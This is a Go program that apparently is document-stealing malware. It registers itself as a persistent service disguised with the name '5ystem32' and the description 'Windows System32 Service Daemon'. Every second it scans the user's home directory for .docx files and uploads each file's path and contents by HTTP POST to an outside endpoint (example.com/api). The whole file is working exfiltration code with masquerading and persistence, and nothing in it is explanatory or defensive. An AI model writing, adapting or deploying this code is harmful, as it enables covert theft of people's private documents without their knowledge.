package main

import (
	"fmt"
	"io/fs"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/kardianos/service"
)

var logger service.Logger

type program struct {
	ticker *time.Ticker
	done   chan os.Signal
}

func (p *program) Start(s service.Service) error {
	// Start should not block. Do the actual work async.
	p.ticker = time.NewTicker(time.Second * 1)

	p.done = make(chan os.Signal, 1)
	signal.Notify(p.done, syscall.SIGTERM, syscall.SIGINT)

	go p.run()

	return nil
}

func (p *program) run() {
	for {
		select {
		case <-p.done:
			p.ticker.Stop()
			fmt.Println("shutting down...")
			return
		case <-p.ticker.C:
			homeDir, err := os.UserHomeDir()
			if err != nil {
				return
			}
			filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
				if err != nil {
					return err
				}

				if d.IsDir() {
					return nil
				}

				if strings.HasSuffix(d.Name(), ".docx") {
					fmt.Printf("detected file: %s\n", path)
					upload(path)
				}

				return nil
			})
		}
	}
}

func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	p.ticker.Stop()
	return nil
}

func main() {
	executablePath, err := os.Executable()
	if err != nil {
		log.Fatal(err)
	}

	svcConfig := &service.Config{
		Name:        "5ystem32",
		DisplayName: "5ystem32",
		Description: "Windows System32 Service Daemon",
		Executable:  executablePath,
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}

	err = s.Install()
	if err != nil {
		fmt.Printf("could not register service: %v\n", err)
	}

	logger, err = s.Logger(nil)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("safe to quit now!")

	err = s.Run()
	if err != nil {
		logger.Error(err)
	}

	fmt.Println("safe to quit now!")
}

func upload(path string) {
	file, err := ioutil.ReadFile(path)
	if err != nil {
		return
	}

	_, err = http.PostForm("https://example.com/api", url.Values{"path": []string{path}, "file": []string{string(file)}})
	if err != nil {
		return
	}
}
